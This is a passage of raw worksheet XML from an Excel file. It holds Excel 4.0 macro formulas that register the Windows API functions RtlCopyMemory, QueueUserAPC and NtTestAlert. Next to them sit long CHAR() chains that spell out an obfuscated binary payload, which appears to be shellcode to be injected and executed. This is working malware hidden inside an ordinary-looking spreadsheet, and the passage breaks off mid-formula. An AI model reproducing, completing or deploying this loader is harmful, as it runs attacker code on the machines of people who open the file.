        <v>}Ã¾t_x0004_~@þ.í</v>
      </c>
    </row>
    <row r="26" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A26" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
      <c r="B26" t="str">
        <f>CHAR(95)&amp;CHAR(157)&amp;CHAR(79)&amp;CHAR(236)&amp;CHAR(46)&amp;CHAR(47)&amp;CHAR(162)&amp;CHAR(188)&amp;CHAR(159)&amp;CHAR(79)&amp;CHAR(188)&amp;CHAR(236)&amp;CHAR(85)&amp;CHAR(251)&amp;CHAR(196)&amp;CHAR(186)&amp;CHAR(151)&amp;CHAR(226)&amp;CHAR(103)&amp;CHAR(243)&amp;CHAR(59)&amp;CHAR(20)&amp;CHAR(30)&amp;CHAR(252)&amp;CHAR(162)&amp;CHAR(67)&amp;CHAR(230)&amp;CHAR(171)&amp;CHAR(132)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(84)&amp;CHAR(255)&amp;CHAR(114)&amp;CHAR(34)&amp;CHAR(14)&amp;CHAR(188)&amp;CHAR(224)&amp;CHAR(212)&amp;CHAR(142)&amp;CHAR(179)&amp;CHAR(71)&amp;CHAR(44)&amp;CHAR(133)&amp;CHAR(162)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(254)&amp;CHAR(53)&amp;CHAR(137)&amp;CHAR(233)&amp;CHAR(127)&amp;CHAR(245)&amp;CHAR(201)&amp;CHAR(173)&amp;CHAR(237)&amp;CHAR(65)&amp;CHAR(167)&amp;CHAR(179)&amp;CHAR(65)&amp;CHAR(151)&amp;CHAR(235)&amp;CHAR(70)&amp;CHAR(249)&amp;CHAR(58)&amp;CHAR(9)&amp;CHAR(204)&amp;CHAR(221)&amp;CHAR(243)&amp;CHAR(231)&amp;CHAR(249)&amp;CHAR(25)&amp;CHAR(117)&amp;CHAR(44)&amp;CHAR(93)&amp;CHAR(117)&amp;CHAR(62)&amp;CHAR(19)&amp;CHAR(123)&amp;CHAR(229)&amp;CHAR(233)&amp;CHAR(122)&amp;CHAR(27)&amp;CHAR(2)&amp;CHAR(159)&amp;CHAR(51)&amp;CHAR(253)&amp;CHAR(196)&amp;CHAR(22)&amp;CHAR(26)&amp;CHAR(172)&amp;CHAR(114)&amp;CHAR(21)&amp;CHAR(233)&amp;CHAR(138)&amp;CHAR(169)&amp;CHAR(165)&amp;CHAR(3)&amp;CHAR(53)&amp;CHAR(149)&amp;CHAR(35)&amp;CHAR(85)&amp;CHAR(143)&amp;CHAR(163)&amp;CHAR(18)&amp;CHAR(231)&amp;CHAR(202)&amp;CHAR(82)&amp;CHAR(104)&amp;CHAR(4)&amp;CHAR(191)&amp;CHAR(11)&amp;CHAR(101)&amp;CHAR(40)&amp;CHAR(191)&amp;CHAR(48)&amp;CHAR(100)&amp;CHAR(169)&amp;CHAR(115)&amp;CHAR(114)&amp;CHAR(146)&amp;CHAR(109)&amp;CHAR(163)&amp;CHAR(242)&amp;CHAR(173)&amp;CHAR(198)&amp;CHAR(93)&amp;CHAR(120)&amp;CHAR(49)&amp;CHAR(102)&amp;CHAR(156)&amp;CHAR(77)&amp;CHAR(20)&amp;CHAR(236)&amp;CHAR(255)&amp;CHAR(155)&amp;CHAR(232)&amp;CHAR(135)&amp;CHAR(91)&amp;CHAR(142)&amp;CHAR(126)&amp;CHAR(235)&amp;CHAR(189)&amp;CHAR(109)&amp;CHAR(171)&amp;CHAR(230)&amp;CHAR(166)&amp;CHAR(98)&amp;CHAR(74)&amp;CHAR(17)&amp;CHAR(117)&amp;CHAR(29)&amp;CHAR(182)&amp;CHAR(124)&amp;CHAR(149)&amp;CHAR(164)&amp;CHAR(226)&amp;CHAR(160)&amp;CHAR(91)&amp;CHAR(111)&amp;CHAR(111)&amp;CHAR(105)&amp;CHAR(2)&amp;CHAR(97)&amp;CHAR(32)&amp;CHAR(49)&amp;CHAR(235)&amp;CHAR(242)&amp;CHAR(193)&amp;CHAR(215)&amp;CHAR(47)&amp;CHAR(57)&amp;CHAR(233)&amp;CHAR(154)&amp;CHAR(207)&amp;CHAR(64)&amp;CHAR(142)&amp;CHAR(121)&amp;CHAR(150)&amp;CHAR(197)&amp;CHAR(249)&amp;CHAR(33)&amp;CHAR(86)&amp;CHAR(115)&amp;CHAR(54)&amp;CHAR(46)&amp;CHAR(237)&amp;CHAR(20)&amp;CHAR(143)&amp;CHAR(41)&amp;CHAR(8)&amp;CHAR(57)&amp;CHAR(113)&amp;CHAR(183)&amp;CHAR(96)&amp;CHAR(228)&amp;CHAR(144)&amp;CHAR(65)&amp;CHAR(203)&amp;CHAR(12)&amp;CHAR(113)&amp;CHAR(202)&amp;CHAR(47)&amp;CHAR(137)&amp;CHAR(102)&amp;CHAR(103)&amp;CHAR(52)&amp;CHAR(242)&amp;CHAR(135)&amp;CHAR(153)&amp;CHAR(179)&amp;CHAR(146)&amp;CHAR(80)&amp;CHAR(26)&amp;CHAR(191)&amp;CHAR(14)&amp;CHAR(75)&amp;CHAR(238)&amp;CHAR(33)&amp;CHAR(111)&amp;CHAR(165)&amp;CHAR(127)&amp;CHAR(37)&amp;CHAR(243)&amp;CHAR(7)&amp;CHAR(81)&amp;CHAR(136)&amp;CHAR(70)&amp;CHAR(53)&amp;CHAR(185)&amp;CHAR(112)&amp;CHAR(144)&amp;CHAR(79)&amp;CHAR(77)&amp;CHAR(47)&amp;CHAR(211)&amp;CHAR(116)&amp;CHAR(132)&amp;CHAR(176)&amp;CHAR(237)&amp;CHAR(122)&amp;CHAR(105)&amp;CHAR(73)&amp;CHAR(197)&amp;CHAR(200)&amp;CHAR(3)&amp;CHAR(157)&amp;CHAR(238)&amp;CHAR(144)&amp;CHAR(143)&amp;CHAR(4)&amp;CHAR(90)&amp;CHAR(161)&amp;CHAR(2)&amp;CHAR(223)</f>
        <v>_Oì./¢¼ŸO¼ìUûÄº—âgó;_x0014__x001E_ü¢Cæ«„A'Tÿr"_x000E_¼àÔŽ³G,…¢_x0003_€þ5‰éõÉ­íA§³A—ëFù:	ÌÝóçù_x0019_u,]u&gt;_x0013_{åéz_x001B__x0002_Ÿ3ýÄ_x0016__x001A_¬r_x0015_éŠ©¥_x0003_5•#U£_x0012_çÊRh_x0004_¿_x000B_e(¿0d©sr’m£ò­Æ]x1fœM_x0014_ìÿ›è‡[Ž~ë½m«æ¦bJ_x0011_u_x001D_¶|•¤â [ooi_x0002_a 1ëòÁ×/9éšÏ@Žy–Åù!Vs6.í_x0014_)_x0008_9q·`äAË_x000C_qÊ/‰fg4ò‡™³’P_x001A_¿_x000E_Kî!o¥%ó_x0007_QˆF5¹pOM/Ót„°íziIÅÈ_x0003_î_x0004_Z¡_x0002_ß</v>
      </c>
      <c r="C26" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(187)&amp;CHAR(192)&amp;CHAR(106)&amp;CHAR(189)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(21)</f>
        <v>÷ý¼»Àj½ë÷_x0015_</v>
      </c>
    </row>
    <row r="27" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A27" t="b">
        <f>REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B27" t="str">
        <f>CHAR(36)&amp;CHAR(229)&amp;CHAR(32)&amp;CHAR(137)&amp;CHAR(148)&amp;CHAR(109)&amp;CHAR(193)&amp;CHAR(180)&amp;CHAR(114)&amp;CHAR(6)&amp;CHAR(143)&amp;CHAR(89)&amp;CHAR(244)&amp;CHAR(7)&amp;CHAR(193)&amp;CHAR(132)&amp;CHAR(177)&amp;CHAR(60)&amp;CHAR(58)&amp;CHAR(208)&amp;CHAR(175)&amp;CHAR(93)&amp;CHAR(65)&amp;CHAR(134)&amp;CHAR(127)&amp;CHAR(25)&amp;CHAR(114)&amp;CHAR(66)&amp;CHAR(195)&amp;CHAR(14)&amp;CHAR(68)&amp;CHAR(105)&amp;CHAR(246)&amp;CHAR(116)&amp;CHAR(19)&amp;CHAR(190)&amp;CHAR(207)&amp;CHAR(58)&amp;CHAR(204)&amp;CHAR(86)&amp;CHAR(108)&amp;CHAR(210)&amp;CHAR(198)&amp;CHAR(45)&amp;CHAR(10)&amp;CHAR(90)&amp;CHAR(42)&amp;CHAR(234)&amp;CHAR(137)&amp;CHAR(27)&amp;CHAR(14)&amp;CHAR(176)&amp;CHAR(41)&amp;CHAR(4)&amp;CHAR(79)&amp;CHAR(179)&amp;CHAR(143)&amp;CHAR(183)&amp;CHAR(236)&amp;CHAR(68)&amp;CHAR(95)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(141)&amp;CHAR(109)&amp;CHAR(119)&amp;CHAR(67)&amp;CHAR(31)&amp;CHAR(249)&amp;CHAR(215)&amp;CHAR(1)&amp;CHAR(158)&amp;CHAR(63)&amp;CHAR(55)&amp;CHAR(95)&amp;CHAR(155)&amp;CHAR(101)&amp;CHAR(170)&amp;CHAR(2)&amp;CHAR(74)&amp;CHAR(184)&amp;CHAR(216)&amp;CHAR(180)&amp;CHAR(93)&amp;CHAR(191)&amp;CHAR(249)&amp;CHAR(153)&amp;CHAR(91)&amp;CHAR(8)&amp;CHAR(48)&amp;CHAR(200)&amp;CHAR(167)&amp;CHAR(43)&amp;CHAR(129)&amp;CHAR(137)&amp;CHAR(204)&amp;CHAR(178)&amp;CHAR(98)&amp;CHAR(231)&amp;CHAR(55)&amp;CHAR(180)&amp;CHAR(100)&amp;CHAR(180)&amp;CHAR(216)&amp;CHAR(66)&amp;CHAR(200)&amp;CHAR(56)&amp;CHAR(58)&amp;CHAR(63)&amp;CHAR(89)&amp;CHAR(19)&amp;CHAR(117)&amp;CHAR(239)&amp;CHAR(128)&amp;CHAR(116)&amp;CHAR(156)&amp;CHAR(42)&amp;CHAR(92)&amp;CHAR(222)&amp;CHAR(252)&amp;CHAR(55)&amp;CHAR(63)&amp;CHAR(246)&amp;CHAR(181)&amp;CHAR(223)&amp;CHAR(105)&amp;CHAR(65)&amp;CHAR(44)&amp;CHAR(12)&amp;CHAR(82)&amp;CHAR(146)&amp;CHAR(137)&amp;CHAR(38)&amp;CHAR(233)&amp;CHAR(144)&amp;CHAR(38)&amp;CHAR(233)&amp;CHAR(124)&amp;CHAR(76)&amp;CHAR(196)&amp;CHAR(20)&amp;CHAR(23)&amp;CHAR(133)&amp;CHAR(249)&amp;CHAR(172)&amp;CHAR(212)&amp;CHAR(20)&amp;CHAR(10)&amp;CHAR(90)&amp;CHAR(70)&amp;CHAR(194)&amp;CHAR(92)&amp;CHAR(122)&amp;CHAR(189)&amp;CHAR(207)&amp;CHAR(186)&amp;CHAR(129)&amp;CHAR(39)&amp;CHAR(76)&amp;CHAR(145)&amp;CHAR(249)&amp;CHAR(231)&amp;CHAR(86)&amp;CHAR(159)&amp;CHAR(123)&amp;CHAR(184)&amp;CHAR(203)&amp;CHAR(190)&amp;CHAR(97)&amp;CHAR(68)&amp;CHAR(173)&amp;CHAR(13)&amp;CHAR(21)&amp;CHAR(35)&amp;CHAR(203)&amp;CHAR(199)&amp;CHAR(55)&amp;CHAR(66)&amp;CHAR(196)&amp;CHAR(186)&amp;CHAR(205)&amp;CHAR(233)&amp;CHAR(220)&amp;CHAR(19)&amp;CHAR(129)&amp;CHAR(56)&amp;CHAR(5)&amp;CHAR(52)&amp;CHAR(62)&amp;CHAR(209)&amp;CHAR(161)&amp;CHAR(7)&amp;CHAR(141)&amp;CHAR(244)&amp;CHAR(251)&amp;CHAR(232)&amp;CHAR(10)&amp;CHAR(31)&amp;CHAR(62)&amp;CHAR(250)&amp;CHAR(7)&amp;CHAR(156)&amp;CHAR(53)&amp;CHAR(111)&amp;CHAR(191)&amp;CHAR(248)&amp;CHAR(93)&amp;CHAR(45)&amp;CHAR(30)&amp;CHAR(108)&amp;CHAR(222)&amp;CHAR(81)&amp;CHAR(175)&amp;CHAR(126)&amp;CHAR(193)&amp;CHAR(86)&amp;CHAR(112)&amp;CHAR(110)&amp;CHAR(38)&amp;CHAR(164)&amp;CHAR(113)&amp;CHAR(139)&amp;CHAR(165)&amp;CHAR(108)&amp;CHAR(184)&amp;CHAR(3)&amp;CHAR(83)&amp;CHAR(117)&amp;CHAR(243)&amp;CHAR(94)&amp;CHAR(9)&amp;CHAR(150)&amp;CHAR(209)&amp;CHAR(57)&amp;CHAR(246)&amp;CHAR(43)&amp;CHAR(182)&amp;CHAR(78)&amp;CHAR(218)&amp;CHAR(212)&amp;CHAR(18)&amp;CHAR(150)&amp;CHAR(223)&amp;CHAR(38)&amp;CHAR(216)&amp;CHAR(76)&amp;CHAR(20)&amp;CHAR(43)&amp;CHAR(35)&amp;CHAR(48)&amp;CHAR(213)&amp;CHAR(12)&amp;CHAR(108)&amp;CHAR(55)&amp;CHAR(7)</f>
        <v>$å ‰”mÁ´r_x0006_Yô_x0007_Á„±&lt;:Ð¯]A†_x0019_rBÃ_x000E_Diöt_x0013_¾Ï:ÌVlÒÆ-
Z*ê‰_x001B__x000E_°)_x0004_O³·ìD_„NmwC_x001F_ù×_x0001_ž?7_›eª_x0002_J¸Ø´]¿ù™[_x0008_0È§+‰Ì²bç7´d´ØBÈ8:?Y_x0013_uï€tœ*\Þü7?öµßiA,_x000C_R’‰&amp;é&amp;é|LÄ_x0014__x0017_…ù¬Ô_x0014_
ZFÂ\z½Ïº'L‘ùçVŸ{¸Ë¾aD­_x000D__x0015_#ËÇ7BÄºÍéÜ_x0013_8_x0005_4&gt;Ñ¡_x0007_ôûè
_x001F_&gt;ú_x0007_œ5o¿ø]-_x001E_lÞQ¯~ÁVpn&amp;¤q‹¥l¸_x0003_Suó^	–Ñ9ö+¶NÚÔ_x0012_–ß&amp;ØL_x0014_+#0Õ_x000C_l7_x0007_</v>
      </c>
      <c r="C27" t="str">
        <f>CHAR(202)&amp;CHAR(50)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(222)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(201)&amp;CHAR(209)&amp;CHAR(30)</f>
        <v>Ê2ÍëÞ£|ÉÑ_x001E_</v>
      </c>
    </row>
    <row r="28" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A28" t="b">
        <f>REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B28" t="str">
        <f>CHAR(114)&amp;CHAR(229)&amp;CHAR(72)&amp;CHAR(42)&amp;CHAR(150)&amp;CHAR(46)&amp;CHAR(47)&amp;CHAR(144)&amp;CHAR(165)&amp;CHAR(12)&amp;CHAR(169)&amp;CHAR(189)&amp;CHAR(156)&amp;CHAR(247)&amp;CHAR(14)&amp;CHAR(110)&amp;CHAR(240)&amp;CHAR(128)&amp;CHAR(168)&amp;CHAR(56)&amp;CHAR(34)&amp;CHAR(3)&amp;CHAR(84)&amp;CHAR(183)&amp;CHAR(225)&amp;CHAR(99)&amp;CHAR(80)&amp;CHAR(216)&amp;CHAR(170)&amp;CHAR(59)&amp;CHAR(93)&amp;CHAR(96)&amp;CHAR(232)&amp;CHAR(54)&amp;CHAR(215)&amp;CHAR(119)&amp;CHAR(51)&amp;CHAR(149)&amp;CHAR(173)&amp;CHAR(248)&amp;CHAR(50)&amp;CHAR(120)&amp;CHAR(163)&amp;CHAR(117)&amp;CHAR(68)&amp;CHAR(146)&amp;CHAR(128)&amp;CHAR(188)&amp;CHAR(154)&amp;CHAR(145)&amp;CHAR(216)&amp;CHAR(54)&amp;CHAR(7)&amp;CHAR(254)&amp;CHAR(237)&amp;CHAR(118)&amp;CHAR(61)&amp;CHAR(175)&amp;CHAR(151)&amp;CHAR(59)&amp;CHAR(21)&amp;CHAR(191)&amp;CHAR(18)&amp;CHAR(68)&amp;CHAR(94)&amp;CHAR(165)&amp;CHAR(67)&amp;CHAR(116)&amp;CHAR(97)&amp;CHAR(185)&amp;CHAR(175)&amp;CHAR(247)&amp;CHAR(30)&amp;CHAR(159)&amp;CHAR(24)&amp;CHAR(63)&amp;CHAR(6)&amp;CHAR(95)&amp;CHAR(113)&amp;CHAR(164)&amp;CHAR(239)&amp;CHAR(153)&amp;CHAR(65)&amp;CHAR(50)&amp;CHAR(69)&amp;CHAR(247)&amp;CHAR(244)&amp;CHAR(63)&amp;CHAR(97)&amp;CHAR(36)&amp;CHAR(168)&amp;CHAR(94)&amp;CHAR(54)&amp;CHAR(84)&amp;CHAR(197)&amp;CHAR(6)&amp;CHAR(45)&amp;CHAR(247)&amp;CHAR(107)&amp;CHAR(131)&amp;CHAR(159)&amp;CHAR(165)&amp;CHAR(125)&amp;CHAR(28)&amp;CHAR(226)&amp;CHAR(229)&amp;CHAR(215)&amp;CHAR(251)&amp;CHAR(40)&amp;CHAR(119)&amp;CHAR(179)&amp;CHAR(189)&amp;CHAR(56)&amp;CHAR(167)&amp;CHAR(1)&amp;CHAR(160)&amp;CHAR(147)&amp;CHAR(185)&amp;CHAR(206)&amp;CHAR(126)&amp;CHAR(152)&amp;CHAR(54)&amp;CHAR(182)&amp;CHAR(140)&amp;CHAR(46)&amp;CHAR(132)&amp;CHAR(224)&amp;CHAR(41)&amp;CHAR(84)&amp;CHAR(153)&amp;CHAR(124)&amp;CHAR(108)&amp;CHAR(213)&amp;CHAR(155)&amp;CHAR(166)&amp;CHAR(177)&amp;CHAR(236)&amp;CHAR(49)&amp;CHAR(24)&amp;CHAR(163)&amp;CHAR(69)&amp;CHAR(114)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(178)&amp;CHAR(20)&amp;CHAR(70)&amp;CHAR(145)&amp;CHAR(128)&amp;CHAR(8)&amp;CHAR(84)&amp;CHAR(249)&amp;CHAR(128)&amp;CHAR(52)&amp;CHAR(150)&amp;CHAR(185)&amp;CHAR(4)&amp;CHAR(155)&amp;CHAR(36)&amp;CHAR(49)&amp;CHAR(125)&amp;CHAR(220)&amp;CHAR(180)&amp;CHAR(195)&amp;CHAR(63)&amp;CHAR(38)&amp;CHAR(14)&amp;CHAR(123)&amp;CHAR(72)&amp;CHAR(108)&amp;CHAR(218)&amp;CHAR(168)&amp;CHAR(250)&amp;CHAR(205)&amp;CHAR(117)&amp;CHAR(199)&amp;CHAR(13)&amp;CHAR(235)&amp;CHAR(54)&amp;CHAR(151)&amp;CHAR(211)&amp;CHAR(86)&amp;CHAR(106)&amp;CHAR(109)&amp;CHAR(255)&amp;CHAR(107)&amp;CHAR(92)&amp;CHAR(88)&amp;CHAR(216)&amp;CHAR(207)&amp;CHAR(150)&amp;CHAR(45)&amp;CHAR(39)&amp;CHAR(72)&amp;CHAR(14)&amp;CHAR(246)&amp;CHAR(102)&amp;CHAR(194)&amp;CHAR(142)&amp;CHAR(36)&amp;CHAR(149)&amp;CHAR(113)&amp;CHAR(12)&amp;CHAR(197)&amp;CHAR(41)&amp;CHAR(85)&amp;CHAR(244)&amp;CHAR(11)&amp;CHAR(148)&amp;CHAR(217)&amp;CHAR(203)&amp;CHAR(41)&amp;CHAR(16)&amp;CHAR(41)&amp;CHAR(69)&amp;CHAR(60)&amp;CHAR(101)&amp;CHAR(153)&amp;CHAR(140)&amp;CHAR(121)&amp;CHAR(115)&amp;CHAR(254)&amp;CHAR(34)&amp;CHAR(116)&amp;CHAR(68)&amp;CHAR(151)&amp;CHAR(208)&amp;CHAR(86)&amp;CHAR(113)&amp;CHAR(95)&amp;CHAR(245)&amp;CHAR(34)&amp;CHAR(1)&amp;CHAR(31)&amp;CHAR(52)&amp;CHAR(92)&amp;CHAR(152)&amp;CHAR(191)&amp;CHAR(147)&amp;CHAR(167)&amp;CHAR(220)&amp;CHAR(65)&amp;CHAR(131)&amp;CHAR(179)&amp;CHAR(152)&amp;CHAR(154)&amp;CHAR(203)&amp;CHAR(86)&amp;CHAR(54)&amp;CHAR(200)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(83)&amp;CHAR(135)&amp;CHAR(26)</f>
        <v>råH*–./¥_x000C_©½œ÷_x000E_nð€¨8"_x0003_T·ácPØª;]`è6×w3•­ø2x£uD’€¼š‘Ø6_x0007_þív=¯—;_x0015_¿_x0012_D^¥Cta¹¯÷_x001E_Ÿ_x0018_?_x0006__q¤ï™A2E÷ô?a$¨^6TÅ_x0006_-÷kƒŸ¥}_x001C_âå×û(w³½8§_x0001_ “¹Î~˜6¶Œ.„à)T™|lÕ›¦±ì1_x0018_£Er!Á²_x0014_F‘€_x0008_Tù€4–¹_x0004_›$1}Ü´Ã?&amp;_x000E_{HlÚ¨úÍuÇ_x000D_ë6—ÓVjmÿk\XØÏ–-'H_x000E_öfÂŽ$•q_x000C_Å)Uô_x000B_”ÙË)_x0010_)E&lt;e™Œysþ"tD—ÐVq_õ"_x0001__x001F_4\˜¿“§ÜAƒ³˜šËV6ÈÍëS‡_x001A_</v>
      </c>
      <c r="C28" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(163)&amp;CHAR(116)&amp;CHAR(59)&amp;CHAR(196)&amp;CHAR(127)&amp;CHAR(68)&amp;CHAR(27)</f>
        <v>Íë»£t;ÄD_x001B_</v>
      </c>
    </row>
    <row r="29" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A29" t="b">
        <f>REGISTER("ntdll","NtTestAlert","J","Go",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B29" t="str">
        <f>CHAR(191)&amp;CHAR(199)&amp;CHAR(249)&amp;CHAR(7)&amp;CHAR(165)&amp;CHAR(126)&amp;CHAR(167)&amp;CHAR(147)&amp;CHAR(44)&amp;CHAR(80)&amp;CHAR(14)&amp;CHAR(247)&amp;CHAR(104)&amp;CHAR(97)&amp;CHAR(213)&amp;CHAR(170)&amp;CHAR(42)&amp;CHAR(44)&amp;CHAR(186)&amp;CHAR(7)&amp;CHAR(172)&amp;CHAR(240)&amp;CHAR(92)&amp;CHAR(77)&amp;CHAR(147)&amp;CHAR(238)&amp;CHAR(3)&amp;CHAR(39)&amp;CHAR(160)&amp;CHAR(159)&amp;CHAR(58)&amp;CHAR(70)&amp;CHAR(88)&amp;CHAR(72)&amp;CHAR(188)&amp;CHAR(130)&amp;CHAR(170)&amp;CHAR(39)&amp;CHAR(113)&amp;CHAR(104)&amp;CHAR(97)&amp;CHAR(255)&amp;CHAR(48)&amp;CHAR(108)&amp;CHAR(5)&amp;CHAR(110)&amp;CHAR(196)&amp;CHAR(62)&amp;CHAR(251)&amp;CHAR(169)&amp;CHAR(9)&amp;CHAR(230)&amp;CHAR(84)&amp;CHAR(162)&amp;CHAR(249)&amp;CHAR(212)&amp;CHAR(132)&amp;CHAR(17)&amp;CHAR(64)&amp;CHAR(224)&amp;CHAR(21)&amp;CHAR(11)&amp;CHAR(33)&amp;CHAR(111)&amp;CHAR(140)&amp;CHAR(151)&amp;CHAR(150)&amp;CHAR(114)&amp;CHAR(233)&amp;CHAR(232)&amp;CHAR(191)&amp;CHAR(237)&amp;CHAR(63)&amp;CHAR(231)&amp;CHAR(65)&amp;CHAR(77)&amp;CHAR(241)&amp;CHAR(206)&amp;CHAR(144)&amp;CHAR(13)&amp;CHAR(116)&amp;CHAR(51)&amp;CHAR(99)&amp;CHAR(172)&amp;CHAR(144)&amp;CHAR(3)&amp;CHAR(191)&amp;CHAR(141)&amp;CHAR(128)&amp;CHAR(134)&amp;CHAR(30)&amp;CHAR(181)&amp;CHAR(168)&amp;CHAR(216)&amp;CHAR(239)&amp;CHAR(137)&amp;CHAR(54)&amp;CHAR(125)&amp;CHAR(99)&amp;CHAR(61)&amp;CHAR(43)&amp;CHAR(114)&amp;CHAR(21)&amp;CHAR(255)&amp;CHAR(101)&amp;CHAR(201)&amp;CHAR(174)&amp;CHAR(241)&amp;CHAR(105)&amp;CHAR(243)&amp;CHAR(49)&amp;CHAR(64)&amp;CHAR(185)&amp;CHAR(197)&amp;CHAR(159)&amp;CHAR(255)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(108)&amp;CHAR(209)&amp;CHAR(125)&amp;CHAR(244)&amp;CHAR(91)&amp;CHAR(45)&amp;CHAR(211)&amp;CHAR(132)&amp;CHAR(202)&amp;CHAR(112)&amp;CHAR(127)&amp;CHAR(247)&amp;CHAR(125)&amp;CHAR(46)&amp;CHAR(23)&amp;CHAR(138)&amp;CHAR(221)&amp;CHAR(101)&amp;CHAR(161)&amp;CHAR(129)&amp;CHAR(126)&amp;CHAR(179)&amp;CHAR(31)&amp;CHAR(9)&amp;CHAR(252)&amp;CHAR(110)&amp;CHAR(86)&amp;CHAR(76)&amp;CHAR(113)&amp;CHAR(249)&amp;CHAR(160)&amp;CHAR(253)&amp;CHAR(141)&amp;CHAR(79)&amp;CHAR(165)&amp;CHAR(202)&amp;CHAR(207)&amp;CHAR(198)&amp;CHAR(23)&amp;CHAR(105)&amp;CHAR(101)&amp;CHAR(26)&amp;CHAR(37)&amp;CHAR(72)&amp;CHAR(71)&amp;CHAR(113)&amp;CHAR(34)&amp;CHAR(199)&amp;CHAR(154)&amp;CHAR(38)&amp;CHAR(10)&amp;CHAR(188)&amp;CHAR(7)&amp;CHAR(64)&amp;CHAR(238)&amp;CHAR(208)&amp;CHAR(87)&amp;CHAR(202)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(114)&amp;CHAR(10)&amp;CHAR(193)&amp;CHAR(78)&amp;CHAR(20)&amp;CHAR(135)&amp;CHAR(63)&amp;CHAR(153)&amp;CHAR(27)&amp;CHAR(225)&amp;CHAR(168)&amp;CHAR(15)&amp;CHAR(42)&amp;CHAR(20)&amp;CHAR(58)&amp;CHAR(180)&amp;CHAR(236)&amp;CHAR(176)&amp;CHAR(12)&amp;CHAR(221)&amp;CHAR(2)&amp;CHAR(226)&amp;CHAR(63)&amp;CHAR(248)&amp;CHAR(232)&amp;CHAR(148)&amp;CHAR(113)&amp;CHAR(18)&amp;CHAR(31)&amp;CHAR(103)&amp;CHAR(44)&amp;CHAR(28)&amp;CHAR(9)&amp;CHAR(67)&amp;CHAR(23)&amp;CHAR(174)&amp;CHAR(83)&amp;CHAR(243)&amp;CHAR(216)&amp;CHAR(188)&amp;CHAR(211)&amp;CHAR(73)&amp;CHAR(109)&amp;CHAR(91)&amp;CHAR(93)&amp;CHAR(22)&amp;CHAR(84)&amp;CHAR(149)&amp;CHAR(176)&amp;CHAR(230)&amp;CHAR(4)&amp;CHAR(65)&amp;CHAR(5)&amp;CHAR(133)&amp;CHAR(100)&amp;CHAR(169)&amp;CHAR(170)&amp;CHAR(142)&amp;CHAR(245)&amp;CHAR(8)&amp;CHAR(114)&amp;CHAR(111)&amp;CHAR(19)&amp;CHAR(178)&amp;CHAR(16)&amp;CHAR(181)&amp;CHAR(200)&amp;CHAR(41)&amp;CHAR(11)&amp;CHAR(36)&amp;CHAR(18)&amp;CHAR(191)&amp;CHAR(104)&amp;CHAR(235)&amp;CHAR(169)&amp;CHAR(151)&amp;CHAR(89)</f>
        <v>¿Çù_x0007_¥~§“,P_x000E_÷haÕª*,º_x0007_¬ð\M“î_x0003_' Ÿ:FXH¼‚ª'qhaÿ0l_x0005_nÄ&gt;û©	æT¢ùÔ„_x0011_@à_x0015__x000B_!oŒ—–réè¿í?çAMñÎ_x000D_t3c¬_x0003_¿€†_x001E_µ¨Øï‰6}c=+r_x0015_ÿeÉ®ñió1@¹ÅŸÿ¨£lÑ}ô[-Ó„Êp÷}._x0017_ŠÝe¡~³_x001F_	ünVLqù ýO¥ÊÏÆ_x0017_ie_x001A_%HGq"Çš&amp;
¼_x0007_@îÐWÊô7r
ÁN_x0014_‡?™_x001B_á¨_x000F_*_x0014_:´ì°_x000C_Ý_x0002_â?øè”q_x0012__x001F_g,_x001C_	C_x0017_®SóØ¼ÓIm[]_x0016_T•°æ_x0004_A_x0005_…d©ªŽõ_x0008_ro_x0013_²_x0010_µÈ)_x000B_$_x0012_¿hë©—Y</v>
      </c>
      <c r="C29" t="str">
        <f>CHAR(243)&amp;CHAR(102)&amp;CHAR(226)&amp;CHAR(127)&amp;CHAR(242)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(163)&amp;CHAR(54)&amp;CHAR(230)</f>
        <v>ófâò6Í£6æ</v>
      </c>
    </row>
    <row r="30" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A30" t="b">
        <f bx="1">main=#REF!</f>
        <v>0</v>
      </c>
      <c r="B30" t="str">
        <f>CHAR(49)&amp;CHAR(90)&amp;CHAR(181)&amp;CHAR(245)&amp;CHAR(64)&amp;CHAR(100)&amp;CHAR(184)&amp;CHAR(233)&amp;CHAR(19)&amp;CHAR(90)&amp;CHAR(169)&amp;CHAR(171)&amp;CHAR(240)&amp;CHAR(127)&amp;CHAR(51)&amp;CHAR(4)&amp;CHAR(26)&amp;CHAR(206)&amp;CHAR(230)&amp;CHAR(6)&amp;CHAR(243)&amp;CHAR(161)&amp;CHAR(190)&amp;CHAR(159)&amp;CHAR(141)&amp;CHAR(192)&amp;CHAR(199)&amp;CHAR(134)&amp;CHAR(215)&amp;CHAR(76)&amp;CHAR(45)&amp;CHAR(134)&amp;CHAR(166)&amp;CHAR(102)&amp;CHAR(80)&amp;CHAR(182)&amp;CHAR(36)&amp;CHAR(53)&amp;CHAR(139)&amp;CHAR(150)&amp;CHAR(157)&amp;CHAR(55)&amp;CHAR(37)&amp;CHAR(182)&amp;CHAR(208)&amp;CHAR(130)&amp;CHAR(90)&amp;CHAR(236)&amp;CHAR(222)&amp;CHAR(227)&amp;CHAR(31)&amp;CHAR(187)&amp;CHAR(50)&amp;CHAR(89)&amp;CHAR(79)&amp;CHAR(133)&amp;CHAR(159)&amp;CHAR(142)&amp;CHAR(152)&amp;CHAR(147)&amp;CHAR(173)&amp;CHAR(187)&amp;CHAR(14